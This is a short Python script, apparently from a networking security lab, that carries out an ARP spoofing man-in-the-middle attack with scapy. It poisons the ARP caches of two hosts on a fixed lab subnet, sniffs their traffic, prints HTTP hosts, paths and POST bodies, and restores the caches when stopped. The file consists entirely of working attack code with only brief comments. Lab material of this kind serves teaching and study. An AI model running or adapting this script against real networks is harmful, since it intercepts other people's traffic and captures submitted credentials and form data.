"""
Lab - ARP Spoof Attack
    > Static attack code

# To enable ip forwarding on the host for further tests:
# echo 1 > /proc/sys/net/ipv4/ip_forward

(CC BY-SA 4.0) github.com/moospit
"""

import logging
import time

# supress scapy import warnings
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.layers.http import HTTPRequest
from scapy.all import ARP, send, AsyncSniffer, Packet, Raw


def process_packet(pkt: Packet) -> None:
    """ Process the sniffed packets """
    if pkt.haslayer(HTTPRequest):
        req = pkt[HTTPRequest]
        url = req.Host.decode()
        path = req.Path.decode()
        method = req.Method.decode()

        print(f'HTTP: {url}{path} -> {method}')
        if method == 'POST' and pkt.haslayer(Raw):
            print(f'Data: {pkt[Raw].load}')


def main() -> None:
    """ Do the attack """
    sniff = AsyncSniffer(iface='eth0', prn=process_packet,
                         store=False)

    try:
        sniff.start()
        print('[>] Starting poisoning')
        while True:
            send(ARP(op='is-at', pdst='172.80.183.2',
                 psrc='172.80.183.3', hwsrc='00:00:00:00:00:03'), verbose=False)
            send(ARP(op='is-at', pdst='172.80.183.3',
                 psrc='172.80.183.2', hwsrc='00:00:00:00:00:03'), verbose=False)
            time.sleep(1)  # don't flood the network
    except KeyboardInterrupt:
        print('\n[>] Got keyboard interrupt')
        sniff.stop()

    # clean up victim's arp caches
    print('[>] Cleaning up')
    send(ARP(op='is-at', pdst='172.80.183.2', psrc='172.80.183.3',
         hwsrc='00:00:00:00:00:02'), verbose=False)
    send(ARP(op='is-at', pdst='172.80.183.3', psrc='172.80.183.2',
         hwsrc='00:00:00:00:00:01'), verbose=False)


if __name__ == '__main__':
    main()
